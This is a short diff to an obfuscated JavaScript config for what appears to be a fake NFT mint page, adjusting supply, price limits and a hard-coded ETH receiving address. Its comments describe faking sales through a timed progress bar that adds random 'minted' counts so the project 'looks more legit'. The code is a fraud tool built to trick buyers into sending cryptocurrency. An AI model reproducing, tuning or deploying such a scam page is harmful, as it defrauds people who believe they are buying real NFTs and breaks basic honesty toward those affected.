@@ -25,24 +25,24 @@ function _0x227f(_0x3622d9, _0x2c2f28) {
 	// total is how many nfts can be purchased
     total = [
 	  1,
-	  10
+	  3
 	],
 	price = 0.3,
     // don't know what this is
 	_0xec0157 = _0x520788(269),
     // amount is how many NFTs are being sold.
-	amount = 1000,
+	amount = 333,
     // this value doesn't really need to be changed, it just changes how fast the progress bar moves to show how many NFTs have been purchased.
 	_0x43886a = 30.4,
     // delay basically chooses how often the progress bar should increase in value, the time is in ms.
     // added chooses how many nfts that have been minted with a value between of 1-3 (slower is better, looks more legit if it's a smaller project)
 	delay = [
-	  1500,
-	  4000
+	  3000,
+	  5000
 	],
 	added = [
 	  1,
-	  5
+	  3
 	],
 	address = {
 	  'ETH': '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce',
